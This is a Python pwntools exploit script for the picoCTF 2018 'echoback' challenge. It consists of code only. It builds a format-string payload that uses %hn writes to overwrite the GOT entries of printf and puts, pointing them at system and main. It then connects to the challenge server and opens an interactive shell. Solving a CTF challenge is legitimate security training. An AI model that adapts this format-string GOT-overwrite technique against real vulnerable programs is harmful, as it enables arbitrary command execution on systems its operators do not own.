from pwn import *

target = ELF('./echoback')

r = remote('2018shell1.picoctf.com', 26532)

payload = ''
payload += ''.join([p32(target.got['printf'] + i * 2) for i in range(2)])
payload += ''.join([p32(target.got['puts'] + i * 2) for i in range(2)])
prev = len(payload)
for i in range(2):
	next = target.plt['system'] >> i * 16 & 0xffff
	diff = (next - prev - 1 & 0xffff) + 1
	payload += '%{}c%{}$hn'.format(diff, 7 + i)
	prev = next
for i in range(2):
	next = target.symbols['main'] >> i * 16 & 0xffff
	diff = (next - prev - 1 & 0xffff) + 1
	payload += '%{}c%{}$hn'.format(diff, 9 + i)
	prev = next

r.sendlineafter('input your message:\n', payload)

r.recvuntil('input your message:\n')

r.interactive()
